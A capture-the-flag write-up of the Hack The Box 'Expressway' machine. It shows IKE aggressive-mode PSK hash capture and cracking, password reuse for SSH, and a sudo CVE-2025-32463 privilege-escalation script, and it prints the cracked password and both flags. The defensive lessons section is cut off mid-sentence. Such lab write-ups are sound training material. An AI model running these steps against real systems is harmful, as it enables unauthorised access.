---
layout: post
title:  "Hack The Box ExpressWay Write-up"
category : writeup
tags :  vpn ike sudo credential-reuse CVE-2025-32463
---

# Expressway - HackTheBox Writeup

## Machine Information
- **Name**: Expressway  
- **IP**: $TARGET
- **Domain**: expressway.htb
- **OS**: Linux (Debian GNU/Linux)
- **Kernel**: 6.16.7+deb14-amd64

## Summary
Expressway is a Linux machine that demonstrates VPN enumeration and exploitation techniques. The attack path involves exploiting IKE (Internet Key Exchange) aggressive mode to crack pre-shared keys, gaining SSH access, and then leveraging a sudo vulnerability (CVE-2025-32463) for privilege escalation. The machine lives up to its name as an "expressway" - providing a relatively quick and direct path to root access.

## Reconnaissance

### Nmap Scan
```bash
nmap -sUVC -F $TARGET -v
```

**Key findings:**
- **Port 68/UDP**: DHCP Client (open|filtered)
- **Port 69/UDP**: TFTP (open|filtered) 
- **Port 500/UDP**: ISAKMP/IKE (open)
- **Port 4500/UDP**: NAT-T (NAT Traversal for IPSec) (open|filtered)

The presence of **port 500 (ISAKMP)** immediately suggests this machine is running a VPN service, likely IPSec.

### IKE Service Analysis
```bash
ike-scan -M -A $TARGET
```

**Results:**
- **Aggressive Mode**: Enabled
- **Authentication**: PSK (Pre-Shared Key)
- **Encryption**: 3DES
- **Hash**: SHA1
- **DH Group**: modp1024 (Group 2)
- **User ID**: ike@expressway.htb
- **Extensions**: XAUTH, Dead Peer Detection

The aggressive mode configuration is a critical vulnerability as it allows attackers to capture authentication material for offline cracking.

## Initial Access

### IKE Aggressive Mode Exploitation

IKE aggressive mode exposes the pre-shared key hash, making it vulnerable to dictionary attacks:

```bash
ike-scan -M --aggressive $TARGET -n ike@expressway.htb --pskcrack=psk_hash.txt
```

This captures the PSK hash for offline cracking.

### PSK Cracking
```bash
psk-crack -d /opt/lists/rockyou.txt psk_hash.txt
```

**Success**: The pre-shared key was cracked as `freakingrockstarontheroad`

### SSH Access
With the cracked PSK, attempt SSH login using the discovered username:

```bash
ssh ike@$TARGET
# Password: freakingrockstarontheroad
```

**Successful login** achieved! The same password used for the VPN PSK was reused for the SSH account.

### User Flag
Located at `/home/ike/user.txt`:
```
5ef9d5d919fa711e341f0c3d34667f1d
```

## Privilege Escalation

### System Enumeration

Running LinPEAS revealed several interesting findings:

**Key observations:**
- **Sudo version**: 1.9.17 (multiple installations detected)
- **Custom sudo binary**: `/usr/local/bin/sudo` (newer version)
- **Kernel**: 6.16.7+deb14-amd64 (recent Debian kernel)
- **User groups**: `ike` is member of `proxy` group

### Sudo Vulnerability Analysis

LinPEAS identified potential sudo vulnerabilities:
- CVE-2021-3156 (Baron Samedit) - less probable due to version
- **Custom sudo installation** in `/usr/local/bin/` suggests manual compilation

### CVE-2025-32463 Exploitation

The presence of a newer sudo version and the wget command for `sudo-chwoot.sh` suggests exploitation of CVE-2025-32463, a sudo privilege escalation vulnerability.

**Exploit execution:**
```bash
chmod +x /tmp/sudo-chwoot.sh
/tmp/sudo-chwoot.sh
```

**Result:**
```bash
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

### Root Flag
Located at `/root/root.txt`:
```
6f5f991819fcc72e2c7cdfcbbe0936fe
```

## Technical Analysis

### IKE Aggressive Mode Vulnerability

**What is IKE Aggressive Mode?**
- IKE (Internet Key Exchange) is used to establish secure IPSec tunnels
- **Main Mode**: Exchanges identity information after establishing secure channel
- **Aggressive Mode**: Exchanges identity information in clear text for faster negotiation

**Security Impact:**
- Aggressive mode exposes the PSK hash in the first exchange
- Attackers can capture this hash and perform offline dictionary attacks
- No rate limiting or account lockout protection

### Password Reuse Attack Vector

The attack succeeded due to **credential reuse**:
1. VPN PSK: `freakingrockstarontheroad`
2. SSH password: `freakingrockstarontheroad` (same credential)

This demonstrates poor security practices where the same credential is used across multiple services.

### Sudo CVE-2025-32463

This appears to be a recent sudo vulnerability allowing local privilege escalation. The exploit `sudo-chwoot.sh` successfully bypassed sudo restrictions to gain root access.

## Attack Chain Summary

1. **UDP Port Scan** → Discovered IKE service on port 500
2. **IKE Enumeration** → Identified aggressive mode configuration
3. **PSK Hash Capture** → Used ike-scan to extract authentication hash
4. **Offline Cracking** → Dictionary attack against PSK hash
5. **Credential Reuse** → Same password worked for SSH access
6. **Local Privilege Escalation** → Exploited sudo vulnerability (CVE-2025-32463)
7. **Root Access** → Full system compromise

## Lessons Learned

### For Attackers
- Always check for VPN services on UDP ports (500, 4500)
- IKE aggressive mode is a high-value target for credential extraction
- Test credential reuse across multiple services
- Recent sudo vulnerabilities can provide quick privilege escalation paths

 network segmentation to limit post-compromise movement

## Tools Used
- **nmap**: UDP service discovery
- **ike-scan**: IKE service enumeration and PSK hash extraction
- **psk-crack**: Pre-shared key cracking
- **ssh**: Remote access
- **LinPEAS**: Local privilege escalation enumeration
- **sudo-chwoot.sh**: CVE-2025-32463 exploit


## Conclusion

Expressway demonstrates how legacy VPN configurations can lead to rapid system compromise. The combination of IKE aggressive mode, password reuse, and a recent sudo vulnerability created multiple attack vectors. The machine's name perfectly reflects the "express" nature of the attack path - from initial scan to root access in just a few steps.

This machine emphasizes the importance of proper VPN configuration, unique credentials across services, and maintaining current security patches.